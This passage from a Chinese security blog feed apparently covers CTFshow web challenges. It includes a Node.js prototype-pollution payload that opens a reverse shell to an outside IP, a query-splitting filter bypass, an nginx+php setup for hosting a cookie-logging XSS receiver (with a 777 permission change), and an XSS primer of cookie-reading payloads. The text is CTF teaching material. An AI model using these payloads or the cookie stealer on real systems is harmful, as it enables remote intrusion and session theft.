class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span><span class="token string">"Block"</span><span class="token punctuation">,</span><span class="token property">"nodes"</span><span class="token operator">:</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token property">"compileDebug"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"self"</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token property">"line"</span><span class="token operator">:</span><span class="token string">"global.process.mainModule.constructor._load('child_process').execSync('bash -c \"bash -i >&amp; /dev/tcp/117.72.70.186/6789 0>&amp;1\"')"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><a href="https://xz.aliyun.com/t/7025?time__1311=n4+xnD0Dy7itGQ=47KDsA3rZY=aL274AKfQx">å†æ¢ JavaScript åŸå‹é“¾æ±¡æŸ“åˆ° RCE</a></p><p><a href="https://www.anquanke.com/post/id/236354">å…³äºnodejsçš„ejså’Œjadeæ¨¡æ¿å¼•æ“çš„åŸå‹é“¾æ±¡æŸ“æŒ–æ˜</a></p><h4 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h4><p>Hint:</p><pre class="language-javascript" data-language="javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">type</span><span class="token punctuation">(</span><span class="token string">'html'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> flag <span class="token operator">=</span> <span class="token string">'flag_here'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>url<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">8c|2c|\,</span><span class="token regex-delimiter">/</span><span class="token regex-flags">ig</span></span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">var</span> query <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>query<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>query<span class="token punctuation">.</span>name<span class="token operator">===</span><span class="token string">'admin'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>password<span class="token operator">===</span><span class="token string">'ctfshow'</span><span class="token operator">&amp;&amp;</span>query<span class="token punctuation">.</span>isVIP<span class="token operator">===</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'where is flag. :)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>è¿‡æ»¤äº†é€—å·å’Œé€—å·çš„urlç¼–ç 2Cï¼Œæˆ‘ä»¬ç”¨â€œ&amp;â€è¿æ¥ä¸‰ä¸ªå±æ€§ï¼ŒNodeJSä¼šè‡ªåŠ¨æ‹¼æ¥</p><pre class="language-json" data-language="json"><code class="language-json">?query=<span class="token punctuation">&#123;</span><span class="token property">"name"</span><span class="token operator">:</span><span class="token string">"admin"</span>&amp;query=<span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"ctfshow"</span>&amp;query=<span class="token property">"isVIP"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">&#125;</span></code></pre><p>ä¸è¿‡è¿˜éœ€è¦å¯¹å±æ€§è¿›è¡Œurlç¼–ç ï¼Œpayloadï¼š</p><pre class="language-json" data-language="json"><code class="language-json">?query=%7b%<span class="token number">22</span>%6e%<span class="token number">61</span>%6d%<span class="token number">65</span>%<span class="token number">22</span>%3a%<span class="token number">22</span>%<span class="token number">61</span>%<span class="token number">64</span>%6d%<span class="token number">69</span>%6e%<span class="token number">22</span>&amp;query=%<span class="token number">22</span>%<span class="token number">70</span>%<span class="token number">61</span>%<span class="token number">73</span>%<span class="token number">73</span>%<span class="token number">77</span>%6f%<span class="token number">72</span>%<span class="token number">64</span>%<span class="token number">22</span>%3a%<span class="token number">22</span>%<span class="token number">63</span>%<span class="token number">74</span>%<span class="token number">66</span>%<span class="token number">73</span>%<span class="token number">68</span>%6f%<span class="token number">77</span>%<span class="token number">22</span>&amp;query=%<span class="token number">22</span>%<span class="token number">69</span>%<span class="token number">73</span>%<span class="token number">56</span>%<span class="token number">49</span>%<span class="token number">50</span>%<span class="token number">22</span>%3a%<span class="token number">74</span>%<span class="token number">72</span>%<span class="token number">75</span>%<span class="token number">65</span>%7d</code></pre><p>å› ä¸ºåœ¨getä¹‹å‰åŒå¼•å·ä¼šè¢«urlç¼–ç ä¸º%22ï¼Œä¸â€œctfshowâ€ç»„æˆâ€œ2câ€ï¼Œç¬¦åˆæ­£åˆ™ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å®‰å…¨ç›¸å…³ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFshow </tag>
            
            <tag> nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu18.04ä¸Šnginx+phpç¯å¢ƒæ­å»º</title>
      <link href="/2024/07/24/Ubuntu18.04%E4%B8%8Anginx+php%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2024/07/24/Ubuntu18.04%E4%B8%8Anginx+php%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<h4 id="å†™åœ¨å‰é¢"><a href="#å†™åœ¨å‰é¢" class="headerlink" title="å†™åœ¨å‰é¢"></a>å†™åœ¨å‰é¢</h4><p>åœ¨å­¦ä¹ XSSæ¼æ´è¿‡ç¨‹ä¸­ï¼Œç”±äºç›®å‰å¤§å¤šæ•°XSSå¹³å°éƒ½å˜æˆäº†æ”¶è´¹çš„ï¼Œæ‰€ä»¥æ‰“ç®—è‡ªå·±ç”¨æœåŠ¡å™¨æ­å»ºæ¥å®ŒæˆXSSé¢˜ç›®</p><p>ä¸­é€”é‡åˆ°ä¸å°‘é—®é¢˜ï¼Œè¿™é‡Œåˆ†äº«ä¸€ä¸‹ç»éªŒ</p><p>å®éªŒç¯å¢ƒ</p><p>æ“ä½œç³»ç»Ÿï¼šUbuntu 18.04 64ä½</p><p>nginxï¼š1.14.0</p><p>phpï¼š7.2.17-0</p><p>php-framï¼šphp7.2-fpm</p><h4 id="å®éªŒæ­¥éª¤"><a href="#å®éªŒæ­¥éª¤" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h4><h5 id="å®‰è£…å¿…è¦ç¨‹åºå’Œä¾èµ–"><a href="#å®‰è£…å¿…è¦ç¨‹åºå’Œä¾èµ–" class="headerlink" title="å®‰è£…å¿…è¦ç¨‹åºå’Œä¾èµ–"></a>å®‰è£…å¿…è¦ç¨‹åºå’Œä¾èµ–</h5><p>#å®‰è£…ç¨‹åºåŒ…</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2-fpm   <span class="token comment">#nginxä¸phpä¹‹é—´çš„æ¡¥æ¢</span><span class="token function">sudo</span> <span class="token function">apt</span> remove apache2* <span class="token comment">#åˆ é™¤è‡ªåŠ¨å®‰è£…çš„Apache2ï¼Œæ³¨æ„æœ€åé¢æœ‰æ˜Ÿå·</span><span class="token function">sudo</span> <span class="token function">apt</span> autoremove <span class="token comment"># æ¸…é™¤Apache2çš„ä¾èµ–</span><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> nginx</code></pre><p>#å®‰è£…å¿…è¦ä¾èµ–</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php-json<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php-curl<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2-mysql<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> php7.2-cgi</code></pre><h5 id="æµè§ˆå™¨http-xxxxxx-è‡ªå·±çš„IP-ï¼Œå‡ºç°å¦‚ä¸‹ç•Œé¢å³ä¸ºæˆåŠŸ"><a href="#æµè§ˆå™¨http-xxxxxx-è‡ªå·±çš„IP-ï¼Œå‡ºç°å¦‚ä¸‹ç•Œé¢å³ä¸ºæˆåŠŸ" class="headerlink" title="æµè§ˆå™¨http://xxxxxx(è‡ªå·±çš„IP)ï¼Œå‡ºç°å¦‚ä¸‹ç•Œé¢å³ä¸ºæˆåŠŸ"></a>æµè§ˆå™¨<a href="http://xxxxxx(è‡ªå·±çš„ip),å‡ºç°å¦‚ä¸‹ç•Œé¢å³ä¸ºæˆåŠŸ/">http://xxxxxx(è‡ªå·±çš„IP)ï¼Œå‡ºç°å¦‚ä¸‹ç•Œé¢å³ä¸ºæˆåŠŸ</a></h5><p><img src="welcome.png" loading="lazy"></p><p>æœ‰å¯èƒ½æ˜¾ç¤ºä¸ºé˜¿å¸•å¥‡ä¸»é¡µï¼Œå¯ä»¥å°è¯•åˆ é™¤ &#x2F;var&#x2F;www&#x2F;html&#x2F;index.html</p><p>å› ä¸ºå®‰è£…phpçš„æ—¶å€™ä¼šè‡ªåŠ¨å®‰è£…apache2,å¯¼è‡´å¾€è¿™é‡Œå†™äº†è¿™ä¸ªindex.htmlé™æ€æ–‡ä»¶ï¼Œå¸è½½äº†Apache2ï¼Œä½†è¿™ä¸ªindexæ²¡åˆ æ‰ï¼Œå¯¼è‡´å‡ºç°å¼‚å¸¸ï¼Œé—®é¢˜ä¸å¤§</p><h5 id="é…ç½®php-frm"><a href="#é…ç½®php-frm" class="headerlink" title="é…ç½®php-frm"></a>é…ç½®php-frm</h5><h6 id="ä¿®æ”¹frmé…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹frmé…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹frmé…ç½®æ–‡ä»¶"></a>ä¿®æ”¹frmé…ç½®æ–‡ä»¶</h6><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/php/7.2/fpm/php.ini</code></pre><p>vimä¸æ˜¯å”¯ä¸€é€‰æ‹©ï¼Œä¹Ÿå¯ä»¥æ›´æ¢è‡ªå·±ç†Ÿæ‚‰çš„ç¼–è¾‘å™¨</p><p>#ä¿®æ”¹å¦‚ä¸‹å‚æ•°</p><p><code>;cgi.fix_fathinfo=1</code>æ”¹ä¸º<code>cgi.fix_fathinfo=0</code></p><p><img src="phpini.png" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/php/7.2/fpm/pool.d/www.conf</code></pre><p>#ä¿®æ”¹å¦‚ä¸‹å‚æ•°</p><p>listen &#x3D; 127.0.0.1:9000 ï¼ˆåŸå…ˆå€¼æ˜¯&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sockï¼‰<br>listen.allowed_clients &#x3D; 127.0.0.1<br>pm.max_children &#x3D; 50<br>pm.max_requests &#x3D; 500<br>request_terminate_timeout &#x3D; 0<br>rlimit_files &#x3D; 1024</p><h6 id="ç¼–å†™demoæµ‹è¯•ä¸€ä¸‹"><a href="#ç¼–å†™demoæµ‹è¯•ä¸€ä¸‹" class="headerlink" title="ç¼–å†™demoæµ‹è¯•ä¸€ä¸‹"></a>ç¼–å†™demoæµ‹è¯•ä¸€ä¸‹</h6><p>åœ¨<code>/var/www/html/</code>ä¸‹ç¼–å†™index.php</p><pre class="language-markup" data-language="markup"><code class="language-markup">vim /var/www/html/index.phpå†…å®¹å¦‚ä¸‹ï¼š    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span> Hello,this is test page. <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></code></pre><h6 id="é…ç½®nginx"><a href="#é…ç½®nginx" class="headerlink" title="é…ç½®nginx"></a>é…ç½®nginx</h6><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">vim</span> /etc/nginx/sites-available/default</code></pre><p>åœ¨<code>index.html</code>å‰åŠ ä¸Š<code>index.php</code></p><p>å°†ä»¥ä¸‹æ¡†ä¸­å†…å®¹ä¿®æ”¹</p><pre class="language-http" data-language="http"><code class="language-http">location ~ \.php$ &#123;    root           html;    fastcgi_pass   127.0.0.1:9000;    fastcgi_index  index.php;    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;    include        fastcgi_params;&#125;</code></pre><p><img src="nginx.png" alt="img" loading="lazy"></p><h6 id="é‡å¯æœåŠ¡"><a href="#é‡å¯æœåŠ¡" class="headerlink" title="é‡å¯æœåŠ¡"></a>é‡å¯æœåŠ¡</h6><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> php7.2-fpm restart<span class="token function">sudo</span> <span class="token function">service</span> nginx restart </code></pre><h4 id="æŸ¥çœ‹demoæµ‹è¯•"><a href="#æŸ¥çœ‹demoæµ‹è¯•" class="headerlink" title="æŸ¥çœ‹demoæµ‹è¯•"></a>æŸ¥çœ‹demoæµ‹è¯•</h4><p>æµè§ˆå™¨è®¿é—®è‡ªå·±çš„IP</p><p><img src="Demo.png" loading="lazy"></p><p>è‡³æ­¤å°±å¯ä»¥è¿›è¡Œç¼–å†™è‡ªå·±çš„ç½‘ç«™äº†ï¼Œå› ä¸ºæˆ‘æ˜¯ç”¨ä½œXSSå¹³å°ç”¨ï¼Œæ‰€ä»¥ç®€å•åˆ†äº«ä¸€ä¸‹æˆ‘çš„é—®é¢˜</p><h4 id="é‡åˆ°çš„é—®é¢˜"><a href="#é‡åˆ°çš„é—®é¢˜" class="headerlink" title="é‡åˆ°çš„é—®é¢˜"></a>é‡åˆ°çš„é—®é¢˜</h4><h5 id="ç½‘é¡µæ— æ³•è®¿é—®"><a href="#ç½‘é¡µæ— æ³•è®¿é—®" class="headerlink" title="ç½‘é¡µæ— æ³•è®¿é—®"></a>ç½‘é¡µæ— æ³•è®¿é—®</h5><p>æˆ‘åœ¨<code>/var/www/html/</code>ä¸‹åˆ›å»ºäº†<code>xss</code>çš„ç›®å½•ï¼Œä¸‹é¢æ”¾äº†å¯ä»¥åå¼¹åˆ°cookieçš„php</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Y-m-d h:i:s'</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$log</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cookie.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">,</span><span class="token variable">$time</span><span class="token operator">.</span><span class="token string single-quoted-string">':    '</span><span class="token operator">.</span> <span class="token variable">$cookie</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$log</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>åˆšå¼€å§‹ä¸€ç›´è®¿é—®ä¸äº† æŠ¥é”™ï¼š<code>Not input file specified</code>ç„¶åçœ‹æ—¥å¿—<code>/var/log/nginx/error.log</code></p><pre class="language-bash" data-language="bash"><code class="language-bash">FastCGI sent <span class="token keyword">in</span> stderr: <span class="token string">"Unable to open primary script: /var/www/html//xss/cookie.php (No such file or directory)"</span></code></pre><p>çœ‹åˆ°æ–‡ä»¶è·¯å¾„å¤šäº†ä¸€ä¸ª<code>/</code>äºæ˜¯æŸ¥è¯¢ï¼Œåœ¨é…ç½®nginxçš„æ—¶å€™å‡ºäº†ç‚¹å°é—®é¢˜<code>fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;</code>æ”¹æˆè¿™æ ·åˆ å»å¤šä½™çš„<code>/</code></p><h5 id="æ— æ³•å†™å…¥æ–‡ä»¶"><a href="#æ— æ³•å†™å…¥æ–‡ä»¶" class="headerlink" title="æ— æ³•å†™å…¥æ–‡ä»¶"></a>æ— æ³•å†™å…¥æ–‡ä»¶</h5><p>å› ä¸ºè¿™ä¸ªphpæ˜¯è¦æŠŠåå¼¹è¿‡æ¥çš„cookieå†™å…¥txtçš„ï¼Œæ‰€ä»¥æˆ‘è¿™ä¸ªè™½ç„¶å¯ä»¥æˆåŠŸæ‰“å¼€ï¼Œä½†æ˜¯ä¸€ç›´å†™å…¥ä¸äº†ï¼Œäºæ˜¯æ›´æ”¹ç›®å½•<code>xss</code>çš„æƒé™ä¸º664ï¼Œæ”¹å®Œä¹‹åæ˜¯æœ‰å†™å…¥æƒé™äº†ï¼Œä½†æ˜¯ç½‘é¡µåˆæ‰“ä¸å¼€äº†ï¼Œç„¶åå‘ç°ï¼Œä½œä¸ºç›®å½•ä¸ä»…éœ€è¦å†™å…¥æƒé™ä¹Ÿéœ€è¦å¯æ‰§è¡Œæƒé™ï¼Œäºæ˜¯æ”¹æˆ777ï¼Œå·²ç»å…¨éƒ¨è§£å†³ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç¯å¢ƒæ­å»º </tag>
            
            <tag> nginx+php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webå…¥é—¨-xss</title>
      <link href="/2024/07/24/web%E5%85%A5%E9%97%A8-xss/"/>
      <url>/2024/07/24/web%E5%85%A5%E9%97%A8-xss/</url>
      
        <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><h4 id="XSSåŸç†"><a href="#XSSåŸç†" class="headerlink" title="XSSåŸç†"></a>XSSåŸç†</h4><p>è·¨ç«™è„šæœ¬æ”»å‡»ï¼ˆXSSï¼‰ï¼Œæ˜¯æœ€æ™®éçš„Webåº”ç”¨å®‰å…¨æ¼æ´ã€‚è¿™ç±»æ¼æ´èƒ½å¤Ÿä½¿å¾—æ”»å‡»è€…åµŒå…¥æ¶æ„è„šæœ¬ä»£ç åˆ°æ­£å¸¸ç”¨æˆ·ä¼šè®¿é—®åˆ°çš„é¡µé¢ä¸­ï¼Œå½“æ­£å¸¸ç”¨æˆ·è®¿é—®è¯¥é¡µé¢æ—¶ï¼Œåˆ™å¯å¯¼è‡´åµŒå…¥çš„æ¶æ„è„šæœ¬ä»£ç çš„æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚</p><p>HTMLæ˜¯ä¸€ç§è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼Œé€šè¿‡å°†ä¸€äº›å­—ç¬¦ç‰¹æ®Šåœ°å¯¹å¾…æ¥åŒºåˆ«æ–‡æœ¬å’Œæ ‡è®°ï¼Œä¾‹å¦‚ï¼Œå°äºç¬¦å·ï¼ˆ&lt;ï¼‰è¢«çœ‹ä½œæ˜¯HTMLæ ‡ç­¾çš„å¼€å§‹ï¼Œä¹‹é—´çš„å­—ç¬¦æ˜¯é¡µé¢çš„æ ‡é¢˜ç­‰ç­‰ã€‚å½“åŠ¨æ€é¡µé¢ä¸­æ’å…¥çš„å†…å®¹å«æœ‰è¿™äº›ç‰¹æ®Šå­—ç¬¦ï¼ˆå¦‚&lt;ï¼‰æ—¶ï¼Œç”¨æˆ·æµè§ˆå™¨ä¼šå°†å…¶è¯¯è®¤ä¸ºæ˜¯æ’å…¥äº†HTMLæ ‡ç­¾ï¼Œå½“è¿™äº›HTMLæ ‡ç­¾å¼•å…¥äº†ä¸€æ®µJavaScriptè„šæœ¬æ—¶ï¼Œè¿™äº›è„šæœ¬ç¨‹åºå°±å°†ä¼šåœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­æ‰§è¡Œã€‚æ‰€ä»¥ï¼Œå½“è¿™äº›ç‰¹æ®Šå­—ç¬¦ä¸èƒ½è¢«åŠ¨æ€é¡µé¢æ£€æŸ¥æˆ–æ£€æŸ¥å‡ºç°å¤±è¯¯æ—¶ï¼Œå°±å°†ä¼šäº§ç”ŸXSSæ¼æ´ã€‚</p><p>ä¿—ç§°çš„è§æ¡†å°±æ’ã€‚ä¸ªäººç†è§£ï¼Œç”±äºHTMLçš„æ ‡ç­¾ç‰¹æ€§ï¼Œå¯ä»¥é€šè¿‡ç½‘é¡µçš„è¾“å…¥æ¡†è¾“å…¥è„šæœ¬ä»£ç ï¼Œä½¿ç½‘é¡µæ‰§è¡Œæ¶æ„è„šæœ¬ï¼Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚</p><h4 id="XSSç±»å‹ä»‹ç»"><a href="#XSSç±»å‹ä»‹ç»" class="headerlink" title="XSSç±»å‹ä»‹ç»"></a>XSSç±»å‹ä»‹ç»</h4><h5 id="åå°„å‹"><a href="#åå°„å‹" class="headerlink" title="åå°„å‹"></a><strong>åå°„å‹</strong></h5><p>åå°„å‹è·¨ç«™è„šæœ¬ï¼ˆReflected Cross-Site Scriptingï¼‰æ˜¯æœ€å¸¸è§ï¼Œä¹Ÿæ˜¯ä½¿ç”¨æœ€å¹¿çš„ä¸€ç§ï¼Œå¯å°†æ¶æ„è„šæœ¬é™„åŠ åˆ° URL åœ°å€çš„å‚æ•°ä¸­</p><p>åå°„å‹ XSS çš„åˆ©ç”¨ä¸€èˆ¬æ˜¯æ”»å‡»è€…é€šè¿‡ç‰¹å®šæ‰‹æ³•ï¼ˆå¦‚ç”µå­é‚®ä»¶ï¼‰ï¼Œè¯±ä½¿ç”¨æˆ·å»è®¿é—®ä¸€ä¸ªåŒ…å«æ¶æ„ä»£ç çš„ URLï¼Œå½“å—å®³è€…ç‚¹å‡»è¿™äº›ä¸“é—¨è®¾è®¡çš„é“¾æ¥çš„æ—¶å€™ï¼Œæ¶æ„ä»£ç ä¼šç›´æ¥åœ¨å—å®³è€…ä¸»æœºä¸Šçš„æµè§ˆå™¨æ‰§è¡Œã€‚æ­¤ç±» XSS é€šå¸¸å‡ºç°åœ¨ç½‘ç«™çš„æœç´¢æ ã€ç”¨æˆ·ç™»å½•å£ç­‰åœ°æ–¹ï¼Œå¸¸ç”¨æ¥çªƒå–å®¢æˆ·ç«¯ Cookies æˆ–è¿›è¡Œé’“é±¼æ¬ºéª—ã€‚</p><h5 id="å­˜å‚¨å‹"><a href="#å­˜å‚¨å‹" class="headerlink" title="å­˜å‚¨å‹"></a>å­˜å‚¨å‹</h5><p>æŒä¹…å‹è·¨ç«™è„šæœ¬ï¼ˆPersistent Cross-Site Scriptingï¼‰ä¹Ÿç­‰åŒäºå­˜å‚¨å‹è·¨ç«™è„šæœ¬ï¼ˆStored Cross-Site Scriptingï¼‰ã€‚</p><p>æ­¤ç±» XSS ä¸éœ€è¦ç”¨æˆ·å•å‡»ç‰¹å®š URL å°±èƒ½æ‰§è¡Œè·¨ç«™è„šæœ¬ï¼Œæ”»å‡»è€…äº‹å…ˆå°†æ¶æ„ä»£ç ä¸Šä¼ æˆ–å‚¨å­˜åˆ°æ¼æ´æœåŠ¡å™¨ä¸­ï¼Œåªè¦å—å®³è€…æµè§ˆåŒ…å«æ­¤æ¶æ„ä»£ç çš„é¡µé¢å°±ä¼šæ‰§è¡Œæ¶æ„ä»£ç ã€‚æŒä¹…å‹ XSS ä¸€èˆ¬å‡ºç°åœ¨ç½‘ç«™ç•™è¨€ã€è¯„è®ºã€åšå®¢æ—¥å¿—ç­‰äº¤äº’å¤„ï¼Œæ¶æ„è„šæœ¬å­˜å‚¨åˆ°å®¢æˆ·ç«¯æˆ–è€…æœåŠ¡ç«¯çš„æ•°æ®åº“ä¸­ã€‚</p><h5 id="DOM-å‹"><a href="#DOM-å‹" class="headerlink" title="DOM å‹"></a>DOM å‹</h5><p>ä¼ ç»Ÿçš„ XSS æ¼æ´ä¸€èˆ¬å‡ºç°åœ¨æœåŠ¡å™¨ç«¯ä»£ç ä¸­ï¼Œè€Œ DOM-Based XSS æ˜¯åŸºäº DOM æ–‡æ¡£å¯¹è±¡æ¨¡å‹çš„ä¸€ç§æ¼æ´ï¼Œæ‰€ä»¥ï¼Œå—å®¢æˆ·ç«¯æµè§ˆå™¨çš„è„šæœ¬ä»£ç æ‰€å½±å“ã€‚å®¢æˆ·ç«¯ JavaScript å¯ä»¥è®¿é—®æµè§ˆå™¨çš„ DOM æ–‡æœ¬å¯¹è±¡æ¨¡å‹ï¼Œå› æ­¤èƒ½å¤Ÿå†³å®šç”¨äºåŠ è½½å½“å‰é¡µé¢çš„ URLã€‚æ¢å¥è¯è¯´ï¼Œå®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥é€šè¿‡ DOM åŠ¨æ€åœ°æ£€æŸ¥å’Œä¿®æ”¹é¡µé¢å†…å®¹ï¼Œå®ƒä¸ä¾èµ–äºæœåŠ¡å™¨ç«¯çš„æ•°æ®ï¼Œè€Œä»å®¢æˆ·ç«¯è·å¾— DOM ä¸­çš„æ•°æ®ï¼ˆå¦‚ä» URL ä¸­æå–æ•°æ®ï¼‰å¹¶åœ¨æœ¬åœ°æ‰§è¡Œã€‚å¦ä¸€æ–¹é¢ï¼Œæµè§ˆå™¨ç”¨æˆ·å¯ä»¥æ“çºµ DOM ä¸­çš„ä¸€äº›å¯¹è±¡ï¼Œä¾‹å¦‚ URLã€location ç­‰ã€‚ç”¨æˆ·åœ¨å®¢æˆ·ç«¯è¾“å…¥çš„æ•°æ®å¦‚æœåŒ…å«äº†æ¶æ„ JavaScript è„šæœ¬ï¼Œè€Œè¿™äº›è„šæœ¬æ²¡æœ‰ç»è¿‡é€‚å½“çš„è¿‡æ»¤å’Œæ¶ˆæ¯’ï¼Œé‚£ä¹ˆåº”ç”¨ç¨‹åºå°±å¯èƒ½å—åˆ°åŸºäº DOM çš„ XSS æ”»å‡»ã€‚</p><p>å¸¸è§çš„æ ‡ç­¾</p><p>1.alert()</p><ul><li>alert(â€˜xssâ€™)</li><li>alert(â€œxssâ€)</li><li>alert(&#x2F;xss&#x2F;)</li><li>alert(document.cookie)</li></ul><p>2.confirm()</p><ul><li>confirm(â€˜xssâ€™)</li><li>confirm(â€œxssâ€)</li><li>confirm(&#x2F;xss&#x2F;)</li><li>confirm(document.cookie)</li></ul><p>3.prompt()</p><ul><li>prompt(â€˜xssâ€™)</li><li>prompt(â€œxssâ€)</li><li>prompt(&#x2F;xss&#x2F;)</li><li>prompt(document.coolkie)</li><li>(&#x2F;xss&#x2F;) ä»¥ä¸Šä¸‰ç§æ–¹æ³•éƒ½å¯ä»¥å®ç°ï¼Œä½†æ˜¯ä¼šå¤šå‡ºä¸¤ä¸ªâ€˜&#x2F;â€™</li></ul><p>4.document.write()</p><ul><li>document.write(â€˜</li></ul><h3 id="web316-333"><a href="#web316-333" class="headerlink" title="web316-333"></a>web316-333</h3><h4 id="web316-cookie-script"><a href="#web316-cookie-script" class="headerlink" title="web316(cookie script)"></a>web316(cookie script)</h4><p>å¯ä»¥ä½¿ç”¨xsså¹³å°ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æœåŠ¡å™¨è‡ªå·±æ­å»º</p><p>åœ¨æœåŠ¡å™¨ä¸Šé¢æ”¾ä¸€ä¸ªæ¥å—Cookieçš„æ–‡ä»¶ã€‚</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token 